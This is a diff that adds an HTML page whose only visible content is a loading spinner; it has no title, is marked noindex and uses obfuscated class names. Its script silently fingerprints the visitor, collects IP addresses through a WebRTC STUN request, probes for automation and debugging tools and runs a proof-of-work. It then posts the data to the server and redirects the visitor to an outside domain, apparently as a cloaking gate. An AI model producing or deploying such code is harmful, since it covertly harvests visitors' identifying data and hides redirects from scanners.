@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="robots" content="noindex,nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title></title>
+<style>
+body{margin:0;padding:0;background:#050505;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:system-ui,-apple-system,BlinkMacSystemFont,sans-serif}
+.x45606{display:flex;flex-direction:column;align-items:center;gap:16px}
+.x58897{width:40px;height:40px;border-radius:50%;border:4px solid rgba(255,255,255,0.15);border-top-color:#ffffff;animation:r 0.6s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+.x71123{width:80px;height:4px;border-radius:999px;overflow:hidden;background:rgba(255,255,255,0.08)}
+.x86903{width:40%;height:100%;background:rgba(255,255,255,0.5);animation:m 1.2s ease-in-out infinite}
+@keyframes m{0%{transform:translateX(-100%)}50%{transform:translateX(50%)}100%{transform:translateX(120%)}}
+</style>
+</head>
+<body>
+<div class="x45606">
+<div class="x58897"></div>
+<div class="x71123"><div class="x86903"></div></div>
+</div>
+<script>
+(function(){
+    if(!window||!navigator||!document){return;}
+    if(!window.performance){ window.performance = { now: function(){ return new Date().getTime(); } }; }
+
+    var targetUrl = decodeURIComponent("https%3A%2F%2Fcom-x.life%2Fads.txt");
+    var p = {
+        token: "ODIuMzkuMTUuNDN8MTc5MjQ0ODYyNHwyfDExMTg5M3xjNTcyYTFhZjQwN2Q1NmQxM2NkYzFiMmMwNDcxMDgxYw%3D%3D",
+        mode: "modern",
+        caps: {
+            webdriver: navigator.webdriver===true,
+            touch: ("ontouchstart"in window)||(navigator.maxTouchPoints>0),
+            screen: (typeof screen!=="undefined")?[screen.width,screen.height,screen.colorDepth||24]:[0,0,0],
+            hasRAF: typeof window.requestAnimationFrame==="function",
+            hasCrypto: !!(window.crypto && window.crypto.subtle)
+        }
+    };
+
+    if(!p.caps.hasCrypto){ p.mode = "legacy"; }
+
+    var gs = "", gb = "", gt = Date.now();
+    p.gn = ""; p.gw = !!gs; p.gms = -1; p.fi = "-";
+    try {
+        var im = new Image();
+        im.onload = function(){ p.fi = "1"; };
+        im.onerror = function(){ p.fi = "0"; };
+        im.src = "/favicon.ico";
+    } catch(_){}
+    if(gs){
+        try {
+            window.addEventListener("message", function(e){
+                if(gs.indexOf(e.origin + "/") === 0 && e.data && typeof e.data.gn === "string"){ p.gn = e.data.gn || "e"; p.gw = false; p.gms = Date.now() - gt; }
+            });
+            var fr = document.createElement("iframe");
+            fr.style.display = "none"; fr.tabIndex = -1; fr.src = gs;
+            document.body.appendChild(fr);
+        } catch(_){ p.gw = false; }
+    }
+    p.rw = true; p.rtcm = -1; p.rtip = "";
+    var ips = {};
+    try {
+        if(typeof RTCPeerConnection === "undefined"){ p.rw = false; }
+        else {
+            var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+            pc.onicecandidate = function(e){
+                try {
+                    if(!e || !e.candidate){ if(p.rw){ p.rw = false; p.rtcm = Date.now() - gt; } try{ pc.close(); }catch(_){} return; }
+                    var f = e.candidate.candidate.split(" ");
+                    var ip = f[4] || "";
+                    if(ip && ip.indexOf(".local") < 0 && !ips[ip]){ ips[ip] = 1; }
+                } catch(_){}
+            };
+            pc.createDataChannel("c");
+            pc.createOffer().then(function(o){ return pc.setLocalDescription(o); }).catch(function(){ p.rw = false; });
+        }
+    } catch(_) { p.rw = false; }
+
+    function nav() {
+        try { window.location.replace(targetUrl); } 
+        catch(e) { window.location.href = targetUrl; }
+    }
+
+    function go() {
+        if(!gb || p.gn !== "e" || /(?:^|; )__gnb=/.test(document.cookie) || !window.fetch){ return nav(); }
+        try { document.cookie = "__gnb=1; Max-Age=604800; Path=/; SameSite=Lax"; } catch(_){}
+        var done = false;
+        var tm = setTimeout(function(){ if(!done){ done = true; nav(); } }, 800);
+        function fail(){ if(!done){ done = true; clearTimeout(tm); nav(); } }
+        try {
+            fetch(gb.split("/b.html")[0] + "/p.txt?" + Date.now(), {mode: "no-cors", cache: "no-store", credentials: "omit"}).then(function(){
+                if(done){ return; }
+                done = true; clearTimeout(tm);
+                try { window.location.replace(gb + "&r=" + encodeURIComponent(targetUrl)); } catch(_){ nav(); }
+            }, fail);
+        } catch(_){ fail(); }
+    }
+
+    function sendResult(){
+        if((p.gw || p.rw) && Date.now() - gt < 1400){ setTimeout(sendResult, 100); return; }
+        if(p.rw){ p.rw = false; p.rtcm = -2; try{ pc.close(); }catch(_){} }
+        try { for(var k in ips){ if(p.rtip){ p.rtip += ";"; } p.rtip += k; } } catch(_){}
+        if(p.sent){ return; }
+        p.sent = true;
+        var c = p.caps||{};
+        var s = c.screen||[0,0,0];
+        
+        var params = [];
+        params.push("token=" + encodeURIComponent(p.token||""));
+        params.push("mode=" + encodeURIComponent(p.mode||""));
+        params.push("workTime=" + encodeURIComponent(p.workTime||0));
+        params.push("iterations=" + encodeURIComponent(p.iterations||0));
+        params.push("hasCrypto=" + (c.hasCrypto?"1":"0"));
+        if(p.gn){ params.push("gn=" + encodeURIComponent(p.gn)); }
+        params.push("gms=" + p.gms);
+        params.push("fi=" + p.fi);
+        params.push("rtc=" + p.rtcm);
+        params.push("rtip=" + encodeURIComponent(p.rtip || ""));
+        if(typeof p.powNonce !== "undefined"){
+            params.push("pow_nonce=" + encodeURIComponent(p.powNonce));
+        }
+        if(p.powHash){
+            params.push("pow_hash=" + encodeURIComponent(p.powHash));
+        }
+        params.push("webdriver=" + (c.webdriver?"1":"0"));
+        params.push("touch=" + (c.touch?"1":"0"));
+        params.push("screen_w=" + (s[0]||0));
+        params.push("screen_h=" + (s[1]||0));
+        params.push("screen_cd=" + (s[2]||24));
+        
+        try {
+            var cv = document.createElement("canvas");
+            var gl = cv.getContext("webgl") || cv.getContext("experimental-webgl");
+            if(gl) {
+                var di = gl.getExtension("WEBGL_debug_renderer_info");
+                if(di) {
+                    params.push("wgv=" + encodeURIComponent(gl.getParameter(di.UNMASKED_VENDOR_WEBGL)||""));
+                    params.push("wgr=" + encodeURIComponent(gl.getParameter(di.UNMASKED_RENDERER_WEBGL)||""));
+                }
+            }
+        } catch(e){}
+
+        params.push("tz=" + encodeURIComponent(new Date().getTimezoneOffset()));
+
+        params.push("dpr=" + encodeURIComponent(window.devicePixelRatio||0));
+
+        var cdp_score = 0;
+        var cdp_flags = "";
+        try {
+            var _e = new Error();
+            var _hit = false;
+            Object.defineProperty(_e, "stack", { get: function(){ _hit = true; return ""; }, configurable: true });
+            try { console.debug(_e); } catch(_) {}
+            try { String(_e); } catch(_) {}
+            if (_hit) { cdp_score++; cdp_flags += "S"; }
+        } catch(_) {}
+        try {
+            if (navigator.permissions && navigator.permissions.query && typeof Notification !== "undefined") {
+                navigator.permissions.query({name:"notifications"}).then(function(p2){
+                    if (p2 && p2.state === "denied" && Notification.permission === "default") {
+                        cdp_score++; cdp_flags += "P";
+                    }
+                }).catch(function(){});
+            }
+        } catch(_) {}
+        try {
+            var nc = "[native code]";
+            var baseline = (typeof document !== "undefined" && document.createElement)
+                ? Function.prototype.toString.call(document.createElement)
+                : "";
+            if (baseline.indexOf(nc) !== -1) {
+                var checks = [document.querySelector];
+                if (document.getElementById) checks.push(document.getElementById);
+                for (var i = 0; i < checks.length; i++) {
+                    if (typeof checks[i] === "function" && Function.prototype.toString.call(checks[i]).indexOf(nc) === -1) {
+                        cdp_score++; cdp_flags += "N"; break;
+                    }
+                }
+            }
+        } catch(_) {}
+        params.push("cdp=" + cdp_score);
+        params.push("cdpf=" + encodeURIComponent(cdp_flags));
+
+        var body = params.join("&");
+        post(body);
+    }
+
+    function post(b){
+        var x = new XMLHttpRequest();
+        x.open("POST", "/_v", true);
+        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        x.onreadystatechange = function(){
+            if(x.readyState===4){
+                var r = (x.status===200 && x.responseText) || "";
+                if(r.indexOf("TS ")===0){ showTs(r.substring(3), b); return; }
+                go();
+            }
+        };
+        x.onerror = go;
+        x.send(b);
+    }
+
+    function showTs(k, b){
+        if(p.tsw !== undefined){ try{ turnstile.reset(p.tsw); }catch(_){ go(); } return; }
+        p.tsw = null;
+        var box = document.createElement("div");
+        box.style.minHeight = "65px";
+        document.getElementsByTagName("div")[0].appendChild(box);
+        window.__gtr = function(){
+            try {
+                p.tsw = turnstile.render(box, {
+                    sitekey: k,
+                    callback: function(t){ post(b + "&cfts=" + encodeURIComponent(t)); },
+                    "expired-callback": function(){ try{ turnstile.reset(p.tsw); }catch(_){} }
+                });
+            } catch(_){ go(); }
+        };
+        var s = document.createElement("script");
+        s.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?onload=__gtr&render=explicit";
+        s.async = true;
+        s.onerror = go;
+        document.head.appendChild(s);
+    }
+
+    function toHex(buf){
+        var h=""; var b=new Uint8Array(buf);
+        for(var i=0;i<b.length;i++){ var v=b[i].toString(16); if(v.length===1)v="0"+v; h+=v; }
+        return h;
+    }
+
+    function runModern(){
+        var start = performance.now();
+        var nonce = 0; var iter = 0; var maxTime = 900;
+        if(!window.requestAnimationFrame){ window.requestAnimationFrame=function(cb){return setTimeout(cb,16);}; }
+        
+        function loop(){
+            if (document.hidden) { 
+                start = performance.now();
+                setTimeout(loop, 200);
+                return; 
+            }
+            var now = performance.now();
+            if(now-start > maxTime){
+                p.mode = "legacy"; runLegacy(); return;
+            }
+            var batch = 50; var done = 0;
+            function step(){
+                if(done >= batch){ iter += done; window.requestAnimationFrame(loop); return; }
+                var currentNonce = nonce;
+                var msg = p.token + ":" + currentNonce;
+                nonce++; done++;
+                try {
+                    var enc = new TextEncoder().encode(msg);
+                    crypto.subtle.digest("SHA-256", enc).then(function(hash){
+                        var hex = toHex(hash);
+                        if(hex.slice(0,2)==="00"){
+                            p.powNonce = currentNonce;
+                            p.powHash = hex;
+                            p.workTime = performance.now() - start; p.iterations = iter + done; sendResult();
+                        } else { step(); }
+                    }).catch(function(){ p.mode = "legacy"; runLegacy(); });
+                } catch(e) { p.mode = "legacy"; runLegacy(); }
+            }
+            step();
+        }
+        loop();
+    }
+
+    function runLegacy(){
+        var start = performance.now();
+        var steps = 0; var maxTime = 550;
+        function spin(){
+            if (document.hidden) { 
+                start = performance.now();
+                setTimeout(spin, 200); 
+                return; 
+            }
+            var now = performance.now();
+            if(now-start > maxTime){
+                p.workTime = now-start; p.iterations = steps; sendResult(); return;
+            }
+            for(var i=0; i<2000; i++){ steps++; }
+            if(p.caps.hasRAF && window.requestAnimationFrame){
+                window.requestAnimationFrame(spin);
+            } else { setTimeout(spin, 10); }
+        }
+        spin();
+    }
+
+    try {
+        if(p.mode==="modern" && p.caps.hasCrypto && window.TextEncoder){ runModern(); } 
+        else { p.mode="legacy"; runLegacy(); }
+    } catch(e){ p.mode="legacy"; runLegacy(); }
+
+})();
+</script>
+<noscript>
+<p style="color:#888;text-align:center;margin-top:40vh">
+Для доступа к сайту необходимо включить JavaScript.
+</p>
+</noscript>
+</body>
+</html>
+
